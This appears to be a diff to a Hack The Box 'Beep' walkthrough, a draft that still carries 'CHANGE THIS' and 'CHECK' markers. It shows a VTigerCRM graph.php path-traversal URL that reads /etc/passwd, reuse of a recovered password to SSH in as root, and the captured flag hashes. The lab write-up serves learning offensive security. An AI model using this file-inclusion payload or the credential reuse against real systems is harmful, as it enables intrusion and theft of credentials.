@@ -601,7 +601,7 @@ Shellcodes: No Results
 Nothing. Let's focus on Elastix exploits. Let's also try to get the version of Elastix being ran.
 However, neither the landing page nor Gobuster/Dirbuster revealed the version of Elastix. Viewing Elastix page source on 443 didn't reveal the version either.
 
-## 7. Attacking Elastix on Port 443
+## 7. Attacking Elastix on Port 443 (Method 1: VTigerCRM)
 Using Burp to intercept a response from Elastix, we still do not find any version numbers. Let's just try using some of the exploits we saw from doing `searchsploit elastix`.
 
 Trying the first one, `Elastix 2.2.0 - 'graph.php' Local File Inclusion | php/webapps/37637.pl`, we examine it first.
@@ -784,3 +784,96 @@ FOPPASSWORD=jEhdIekWmdjE
 ARI_ADMIN_PASSWORD=jEhdIekWmdjE
 ```
 We see a common password, `jEhdIekWmdjE`. Since we saw Port 22 opened earlier, we can try to SSH into the system with this password found.
+
+## 8. SSH with Credentials Found, Getting Flags
+Upon getting password `jEhdIekWmdjE`, we can attempt to SSH into the system.
+```
+CHANGE THIS
+
+hippoeug@kali:~$ ssh admin@10.10.10.7 <- CHECK!!!!!!!!!!!!!!!!!!!!
+Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
+```
+
+Ah, let's fix this key exchange method by specifying `diffie-hellman-group1-sha1`.
+```
+CHANGE THIS
+
+hippoeug@kali:~$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 admin@10.10.10.7 <- CHECK!!!!!!!!
+The authenticity of host '10.10.10.7 (10.10.10.7)' can't be established.
+RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.7' (RSA) to the list of known hosts. <- CHECK!!!
+```
+
+We're getting some wrong credentials error <- CHECK!!!
+```
+Permission denied, please try again.
+root@10.10.10.7's password: 
+```
+
+Maybe we are not using a valid username. Let's use the VTigerCRM exploit we used earlier to get the `etc/passwd` file to find the users.
+
+Upon navigating to `(view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action)` on our web browser, we see some usernames indeed.
+```
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/etc/news:
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
+distcache:x:94:94:Distcache:/:/sbin/nologin
+vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
+pcap:x:77:77::/var/arpwatch:/sbin/nologin
+ntp:x:38:38::/etc/ntp:/sbin/nologin
+cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
+dbus:x:81:81:System message bus:/:/sbin/nologin
+apache:x:48:48:Apache:/var/www:/sbin/nologin
+mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin
+rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+spamfilter:x:500:500::/home/spamfilter:/bin/bash
+haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
+xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
+fanis:x:501:501::/home/fanis:/bin/bash
+Sorry! Attempt to access restricted file.
+```
+We see two interesting users, `fanis` and `root`, and did not see the `admin` user which we tried to SSH with.
+
+Let's SSH into root with the credentials we found.
+```
+hippoeug@kali:~$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7
+root@10.10.10.7's password: 
+Last login: Tue Jul 16 11:45:47 2019
+
+Welcome to Elastix 
+----------------------------------------------------
+
+To access your Elastix System, using a separate workstation (PC/MAC/Linux)
+Open the Internet Browser using the following URL:
+http://10.10.10.7
+
+[root@beep ~]# ls
+anaconda-ks.cfg  elastix-pr-2.2-1.i386.rpm  install.log  install.log.syslog  postnochroot  root.txt  webmin-1.570-1.noarch.rpm
+[root@beep ~]# cat root.txt
+89dfb87953f6ecfb95897002221d0311
+...
+[root@beep home]# cd fanis
+...
+[root@beep fanis]# cat user.txt
+798c7c7c1711198d3120ec639be0a321
+```
